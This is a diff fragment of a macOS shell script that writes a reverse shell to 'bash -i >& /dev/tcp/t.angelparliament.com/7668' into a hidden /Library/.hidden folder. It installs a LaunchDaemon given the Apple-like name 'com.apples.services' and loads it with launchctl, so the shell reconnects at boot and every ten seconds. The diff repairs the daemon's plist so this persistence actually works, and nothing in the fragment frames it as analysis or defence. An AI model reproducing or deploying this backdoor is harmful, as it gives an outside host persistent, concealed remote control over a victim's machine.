@@ -5,14 +5,22 @@ bash -i >& /dev/tcp/t.angelparliament.com/7668 0>&1
 wait" > /Library/.hidden/connect.sh
 chmod +x /Library/.hidden/connect.sh
 mkdir -p /Library/LaunchDaemons
-echo 'Label
-com.apples.services
-ProgramArguments
-/bin/sh
-/Library/.hidden/connect.sh
-RunAtLoad
-StartInterval
-10
-AbandonProcessGroup' > /Library/LaunchDaemons/com.apples.services.plist
+echo '<plist version="1.0">
+<dict>
+<key>Label</key>
+<string>com.apples.services</string>
+<key>ProgramArguments</key>
+<array>
+<string>/bin/bash</string>
+<string>/Library/.hidden/connect.sh</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
+<key>StartInterval</key>
+<integer>10</integer>
+<key>AbandonProcessGroup</key>
+<true/>
+</dict>
+</plist>' > /Library/LaunchDaemons/com.apples.services.plist
 chmod 600 /Library/LaunchDaemons/com.apples.services.plist
 launchctl load /Library/LaunchDaemons/com.apples.services.plist
